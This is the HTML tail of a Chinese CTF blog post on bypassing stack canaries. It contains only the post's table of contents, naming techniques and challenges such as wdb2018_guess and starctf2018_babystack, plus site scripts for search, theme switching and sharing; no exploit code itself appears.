+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Canary-Bypass"><span class="toc-text">Canary Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E7%A0%B4Canary"><span class="toc-text">爆破Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bin1"><span class="toc-text">bin1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2%E8%8E%B7%E5%8F%96"><span class="toc-text">泄露获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stack-smash%EF%BC%88ssp-2-27%E4%BB%A5%E4%B8%8A%E5%A4%B1%E6%95%88%EF%BC%89"><span class="toc-text">Stack smash（ssp 2.27以上失效）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wdb2018-guess"><span class="toc-text">wdb2018_guess</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-stack-chk-fail"><span class="toc-text">劫持__stack_chk_fail</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BJDCTF-2nd-r2t4"><span class="toc-text">[BJDCTF 2nd]r2t4</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP1"><span class="toc-text">EXP1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP2"><span class="toc-text">EXP2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%86%E7%9B%96TLS%E4%B8%AD%E5%AD%98%E5%82%A8%E7%9A%84Canary"><span class="toc-text">覆盖TLS中存储的Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#starctf2018-babystack"><span class="toc-text">starctf2018_babystack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + Bypass%20Canary + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F11%2F05%2FBypass-Canary%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/11/05/Bypass-Canary/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
